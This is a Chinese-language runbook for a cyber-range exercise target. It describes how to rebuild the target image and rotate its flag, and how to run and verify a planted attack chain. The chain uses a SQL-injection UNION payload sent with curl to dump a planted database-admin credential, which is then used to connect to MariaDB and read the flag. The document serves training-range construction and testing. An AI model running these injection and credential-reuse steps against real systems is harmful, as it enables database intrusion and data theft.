# Runbook —— 靶機真攻擊鏈（票 #44 / #45 / #46）

單機縱深攻擊鏈：**HTTP SQLi → 撈 dbadmin 帳密 → 直連 :3306 → 讀 flag**。
本檔是操作與驗收手冊；結構契約由 `tests/deploy/test_target_attack_surface.py`（T1，在 CI）證，
真打進去／真拿 flag／真重烤由下方 T4 在大主機證。

## 操作規則（先讀這條）

- **換班就重跑 `range-up`。** flag 綁在環境層，同一套環境連跑多場是同一個 flag（spec §5.1
  的已知代價）。下一梯上場前 `sudo bash scripts/range/range-up.sh --with-falco --with-red`
  重鑄 flag，舊 flag 立即失效。
- 當場 flag 在 host 的 `/var/lib/purplescope/current-flag.txt`，供 Range Core 比對玩家提交。
- flag **不烤進 golden**：改 flag 不觸發重烤；改 `app.py`／`bake.sh`／`seed.sql`／`inject-flag.sh`
  才會（它們在 `golden_stamp` 指紋內）。

## 二分：可計分 vs fixture（不要搞混）

| 端點 | 類別 | 說明 |
|---|---|---|
| `/product?id=` | **可計分**（票 #44） | 真 SQLi，紅隊要真的打 |
| `/exec` `/readsecret` `/uncovered` `/healthz`、alloy heartbeat | fixture | 模擬、不掛 objective、T2/T4 測試載具，**行為不變** |

## 攻擊面的授權邊界（為什麼 SQLi 一跳撈不到 flag）

- `webapp@localhost` —— app 用的帳號。只授 `shopdb.*`（含 `credentials`）。SQLi 的 UNION
  只撈得到這個帳號 grant 得到的表 → 撈得到憑證，**碰不到 `vault.flag`**。
- `dbadmin@'%'` —— 憑證表裡那組帳密，可從 VLAN30 遠端連 :3306，是唯一 grant 得到 `vault.*` 的帳號。
- 結論：非得先 SQLi 撈出 dbadmin 帳密、再以它重連 :3306 不可。這是「內容鏈接」的實際 enforcement。

---

## T4 —— 大主機實環境全鏈（gray 跑）

### 1. 重烤 golden（來源檔已改，指紋不符會自動重烤；也可手動）

```bash
sudo bash scripts/range/build-golden-target.sh
```

自證要看到（缺任一則不產 golden）：

```
GOLDEN-DB-STATE: products=1 credentials=1
GOLDEN-FLAG-GUARD: webapp_can_read_flag=0     # 0 = 授權邊界成立
GOLDEN-RULE-HITS: exec=... secret=... uncovered=...
```

### 2. 起 range（靶機 golden + 六台紅隊，紅隊 image 首次會自動 build）

```bash
sudo bash scripts/range/range-up.sh --with-falco --with-red
```

### 3. 走完攻擊鏈（從任一紅隊容器，來源 IP 可分辨）

```bash
# 第一跳：SQLi 撈 credentials（空格要 URL-encode 成 %20）
docker exec range-red1 curl -s \
  "http://10.167.20.10/product?id=0%20UNION%20SELECT%20id,service,username,password%20FROM%20credentials"
#   → 回傳含 dbadmin / D0-n0t-sh1p-th1s-Cred-2026

# 第二跳：拿撈到的帳密直連 :3306 讀 flag
docker exec range-red1 mariadb -h 10.167.20.10 -u dbadmin \
  -p'D0-n0t-sh1p-th1s-Cred-2026' -N -e "SELECT token FROM vault.flag"
#   → 回傳當場 flag，應與 host 的 /var/lib/purplescope/current-flag.txt 相同
```

### 4. 負向驗收（未經利用拿不到 flag）

```bash
# SQLi 直接想撈 flag：webapp 對 vault 無 grant → 權限錯誤，撈不到
docker exec range-red1 curl -s \
  "http://10.167.20.10/product?id=0%20UNION%20SELECT%201,token,1,1%20FROM%20vault.flag"
#   → query error（權限拒絕），不是 flag

# flag 輪換：再跑一次 range-up，flag 應改變
sudo bash scripts/range/range-up.sh --with-falco
diff <(cat /var/lib/purplescope/current-flag.txt) /tmp/flag-before   # 應不同
```

## T3 —— range 契約（防火牆）

`RED → TARGET tcp dport {80,3306}` 已由 `scripts/range/build-range.sh` 放行，
`scripts/range/verify-range.sh` 驗收。第二跳連 :3306 在網路層成立即為此契約的實用。

## T2 —— compose 整合

本攻擊鏈是 VM golden 專屬（真 mariadb + 授權邊界），**不在 compose 驗**（spec §6.1：只有真 range
算 scenario）。compose 端的 fixture 端點測試不受本票影響（二分的附帶好處）。
